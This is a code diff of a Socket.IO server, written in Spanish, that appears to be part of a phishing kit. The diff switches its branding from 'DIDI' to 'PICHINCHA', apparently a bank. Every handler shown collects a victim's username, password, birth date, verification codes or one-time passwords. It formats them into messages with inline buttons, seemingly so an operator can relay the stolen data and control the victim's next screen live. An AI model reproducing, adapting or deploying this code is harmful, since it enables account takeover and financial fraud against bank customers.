@@ -30,7 +30,7 @@ io.on('connection', (socket) => {
   socket.on('dataForm', ({ usuario, contrasena, fechaNacimiento, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔐 Nuevo intento de acceso DIDI:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n`;
+    const mensaje = `🔐 Nuevo intento de acceso PICHINCHA:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -50,7 +50,7 @@ io.on('connection', (socket) => {
   socket.on('codigoIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔍 El usuario ingresó el siguiente código DIDI:\n\n🧾 Código: ${codigo}`;
+    const mensaje = `🔍 El usuario ingresó el siguiente código PICHINCHA:\n\n🧾 Código: ${codigo}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -70,7 +70,7 @@ io.on('connection', (socket) => {
   socket.on('otpIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `📨 Reintento desde pantalla de error DIDI:\n\n🧾 Nuevo código OTP: ${codigo}`;
+    const mensaje = `📨 Reintento desde pantalla de error PICHINCHA:\n\n🧾 Nuevo código OTP: ${codigo}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -90,7 +90,7 @@ io.on('connection', (socket) => {
   socket.on('errorlogoForm', ({ usuario, contrasena, fechaNacimiento, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `⚠️ Nuevo intento fallido detectado DIDI:\n\n📧 Usuario: ${usuario}\n🔑 Clave: ${contrasena}\n`;
+    const mensaje = `⚠️ Nuevo intento fallido detectado PICHINCHA:\n\n📧 Usuario: ${usuario}\n🔑 Clave: ${contrasena}\n`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
